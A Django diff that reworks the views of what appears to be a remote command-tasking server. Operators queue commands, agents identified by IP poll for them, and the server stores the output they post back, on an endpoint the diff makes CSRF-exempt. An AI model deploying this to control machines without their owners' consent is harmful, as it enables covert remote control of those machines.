@@ -1,5 +1,7 @@
 from django.http import HttpResponse
 from django.contrib.auth import logout
+from django.views.decorators.csrf import csrf_exempt
+from django.utils.decorators import method_decorator
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import render, redirect
 import random
@@ -55,42 +57,61 @@ class IndexView(View):
     def post(self, request):
         clients = create_or_get_user(request).order_by('-last_updated')
         if self.request.POST.get('command'):
-            command = Commands.objects.create(receiver=clients[0],
-                                              command=self.request.POST.get('command'))
+            Commands.objects.create(receiver=clients[0],
+                                    command=self.request.POST.get('command'))
+
         return redirect('index')
 
 
+@method_decorator(csrf_exempt, name='dispatch')
 class SendCommand(View):
     def get(self, request):
         clients = create_or_get_user(request)
         ip = get_client_ip(request)
         agent = clients.filter(address=ip).first()
-        cmd_execution = Commands.objects.filter(receiver=agent).first()
+
+        if not agent:
+            return HttpResponse('Agent not found', status=400)
+
+        cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False).first()
+
         if cmd_execution:
+
             if not cmd_execution.is_executed:
                 cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
-                return HttpResponse(cmd_execution.command)
-        else:
-            return HttpResponse("No command to execute.")
+                return HttpResponse(cmd)
+            else:
+                return HttpResponse("Command already executed.", status=200)
 
-    def post(self, request):
+        return HttpResponse("No command available.", status=200)
+
+    def post(self, request, *args, **kwargs):
         clients = create_or_get_user(request).order_by('-last_updated')
         body = request.body.decode('utf-8')
         ip = get_client_ip(request)
         agent = clients.filter(address=ip).first()
+
+        if not agent:
+            return HttpResponse("No client found for this IP.", status=400)
+
         match = re.search(r'id\s*=\s*(\d+)', body)
-        if match:
-            cmd_id = int(match.group(1))
-            Commands.objects.filter(receiver=agent, id=cmd_id).delete()
-        else:
-            return HttpResponse("mistake detected. no id sent :|")
+        if not match:
+            return HttpResponse("Mistake detected. No ID sent :|", status=400)
 
-        response = re.sub(r'id\s*=\s*(\d+)', '', body)
-        return render(request, 'server_side/index.html', context= {
-            'response': response,
-        })
+        cmd_id = int(match.group(1))
+        print(cmd_id)
 
+        cmd = Commands.objects.filter(receiver=agent, id=cmd_id).first()
 
+        if cmd:
+            cmd.is_executed = True
+            response = re.sub(r'id\s*=\s*(\d+)', '', body).strip()
+            print(response)
+            cmd.command_response = response
+            cmd.save()
+            return HttpResponse("Command executed successfully.", status=200)
+
+        return HttpResponse("Command not found.", status=404)
 
 
 def logout_view(request):
